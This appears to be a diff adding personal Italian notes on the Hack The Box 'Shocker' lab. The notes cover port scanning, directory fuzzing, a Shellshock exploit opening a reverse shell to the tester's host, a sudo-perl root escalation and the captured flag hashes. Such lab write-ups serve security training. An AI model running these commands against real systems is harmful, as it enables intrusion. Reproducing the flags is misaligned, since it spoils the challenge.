@@ -1,0 +1,159 @@
+10.10.10.56
+
+nmap -sC -sV 10.10.10.56
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-22 11:48 CEST
+Nmap scan report for 10.10.10.56
+Host is up (0.29s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.43 seconds
+
+
+ssh sulla porta 2222 non 22
+sulla porta 80 c'è un sito con scritto "don't bug me" e un'immagine
+
+ <!DOCTYPE html>
+<html>
+<body>
+
+<h2>Don't Bug Me!</h2>
+<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">
+
+</body>
+</html> 
+
+nulla di interessante nel codice html
+
+con burp suite:
+GET / HTTP/1.1
+Host: 10.10.10.56
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Fri, 22 Sep 2017 20:01:19 GMT
+If-None-Match: "89-559ccac257884-gzip"
+Cache-Control: max-age=0
+
+Header interessanti:
+If-Modified-Since: Fri, 22 Sep 2017 20:01:19 GMT            //https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/If-Modified-Since
+If-None-Match: "89-559ccac257884-gzip"                      //https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/If-None-Match
+
+HTTP/1.1 200 OK
+Date: Fri, 22 Oct 2021 10:03:50 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Last-Modified: Fri, 22 Sep 2017 20:01:19 GMT
+ETag: "89-559ccac257884-gzip"
+Accept-Ranges: bytes
+Vary: Accept-Encoding
+Content-Length: 137
+Connection: close
+Content-Type: text/html
+
+ <!DOCTYPE html>
+<html>
+<body>
+
+<h2>Don't Bug Me!</h2>
+<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">
+
+</body>
+</html>
+
+riguardo If-None-Match:
+For GET and HEAD methods, the server will return the requested resource, with a 200 status, only if it doesn't have an ETag matching the given ones. For other methods, the request will be processed only if the eventually existing resource's ETag doesn't match any of the values listed.
+
+provo a manfdare una POST
+
+ottengo sempre la stessa resposnse anche cambiando il valore dell'header
+provo con dirb
+
+---- Scanning URL: http://10.10.10.56/ ----
++ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)                                                                   
++ http://10.10.10.56/index.html (CODE:200|SIZE:137)                                                                 
++ http://10.10.10.56/server-status (CODE:403|SIZE:299)  
+
+niente di interessante
+
+l'unica opzione è usare qualche exploit sui servizi aperti:
+
+Apache mod_cgi - 'Shellshock' Remote Command Injection                              | linux/remote/34900.py
+
+OpenSSH 7.2p2 - Username Enumeration                                                | linux/remote/40136.py
+
+potrebbe essere utile quello con shellshock, ma non ho la possibilità di caricare script sulla macchina:
+https://www.exploit-db.com/exploits/34900
+
+./34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.16.2 lport=4444                                      1 ⨯
+[!] Started reverse shell handler
+[-] Trying exploit on : /cgi-sys/entropysearch.cgi
+[*] 404 on : /cgi-sys/entropysearch.cgi
+[-] Trying exploit on : /cgi-sys/defaultwebpage.cgi
+[*] 404 on : /cgi-sys/defaultwebpage.cgi
+[-] Trying exploit on : /cgi-mod/index.cgi
+[*] 404 on : /cgi-mod/index.cgi
+[-] Trying exploit on : /cgi-bin/test.cgi
+[*] 404 on : /cgi-bin/test.cgi
+[-] Trying exploit on : /cgi-bin-sdb/printenv
+[*] 404 on : /cgi-bin-sdb/printenv
+
+
+per gli script normalmente presenti in cgi-bin non funziona, quindi probabilemnte serve trovar eun altro script, quindi faccio fuzzing sulla directory cgi-bi cercando qualche script
+per farlo piu accurato uso gobuster:
+
+sudo gobuster  dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/big.txt -q -n -e -x .sh,.py,.cgi,.pl
+
+http://10.10.10.56/cgi-bin/user.sh              [Size: 118]
+
+mettendo user.sh nello script python (modificato) si ottiene una shell
+
+./34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.16.2 lport=4444                                      1 ⨯
+[!] Started reverse shell handler
+[-] Trying exploit on : /cgi-bin/user.sh
+[!] Successfully exploited
+[!] Incoming connection from 10.10.10.56
+10.10.10.56> id
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+
+
+20260620eddc55ca7133258eb71633c6
+
+
+sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+
+
+si può eseguire perl con sudo senza pwd
+
+quindi uso comando perl èper ottener una shell:
+
+sudo perl -e 'exec "/bin/sh";'
+
+
+7c8292ff4bf56c07fed31d6f3f78ff19
+
+
+
+
+
+
+
